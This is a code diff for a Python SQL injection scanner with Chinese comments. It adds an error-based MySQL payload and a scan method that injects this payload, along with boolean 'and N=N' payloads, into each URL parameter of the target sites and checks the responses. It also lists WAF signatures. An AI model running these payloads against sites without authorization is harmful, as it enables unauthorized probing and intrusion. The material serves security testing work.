@@ -2,11 +2,11 @@
 # __author__ = 'jasonsheh'
 # -*- coding:utf-8 -*-
 
-from urllib.parse import urlparse
 import requests
 import re
 import difflib
 import random
+import time
 
 
 class Sqli:
@@ -14,6 +14,7 @@ class Sqli:
         self.targets = targets
         self.target = ''
         self.results = []
+        self.flag_inserted_urls = []
         self.waf = ''
         self.headers = {'user-agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                       ' (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"'}
@@ -21,6 +22,7 @@ class Sqli:
         self.payload = {' and {}={}'.format(self.rand_num, self.rand_num): ' and {}=0'.format(self.rand_num),
                         "' and '{}'='{}".format(self.rand_num, self.rand_num): "' and '{}'='0".format(self.rand_num)
                         }
+        self.error_based_payload = "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('{}',(SELECT 1),'{}','x'))s), 0,0 )))".format(self.rand_num, self.rand_num)
         self.waf_rule = {
             '安全狗': 'www.safedog.cn',
             '360webscan': 'safe.webscan.360.cn',
@@ -37,6 +39,7 @@ class Sqli:
             500: "服务器错误!",
             401: "未授权!",
             403: "拒绝访问!",
+            404: "not found",
             405: "方法不被允许!",
             406: "无法接受!",
             301: "永久重定向!",
@@ -83,20 +86,16 @@ class Sqli:
                    target.com/a?id=1&page=2insert_payload_here
                   ]
         '''
-
         flag = 'insert_payload_here'
-        res = []
         if '&' in self.target:
             for param in self.target.split('&'):
                 url = self.target.replace(param, param+flag)
-                res.append(url)
+                self.flag_inserted_urls.append(url)
         else:
-            res.append(self.target+flag)
-        return res
+            self.flag_inserted_urls.append(self.target+flag)
 
     def bool_based_scan(self):
-        flag_inserted_urls = self.insert_payload_flag()
-        for inserted_url in flag_inserted_urls:
+        for inserted_url in self.flag_inserted_urls:
             for normal_payload, evil_payload in self.payload.items():
                 normal_conn = self._conn(inserted_url.replace('insert_payload_here', normal_payload))  # 正常连接
                 evil_conn = self._conn(inserted_url.replace('insert_payload_here', evil_payload))
@@ -111,15 +110,27 @@ class Sqli:
                     return self.target
             return False
 
+    def error_based_scan(self):
+        error_based_pattern = self.rand_num + '1' + self.rand_num
+        for inserted_url in self.flag_inserted_urls:
+            error_based_conn = self._conn(inserted_url.replace('insert_payload_here', self.error_based_payload))
+            if not error_based_conn:
+                return False
+            if re.match(error_based_pattern, error_based_conn.text):
+                return self.target
+        return False
+
     def time_based_scan(self):
-        print('do_nothing')
+        print('todo, maybe not')
 
     def scan(self):
         print('sql注入检测')
         for self.target in self.targets:
             self.init()
             if '?' in self.target:
-                result = self.bool_based_scan()
+                self.insert_payload_flag()
+                # result = self.bool_based_scan() or self.error_based_scan()
+                result = self.error_based_scan()
                 if result:
                     print('可能存在注入:' + result)
                     self.results.append(result)
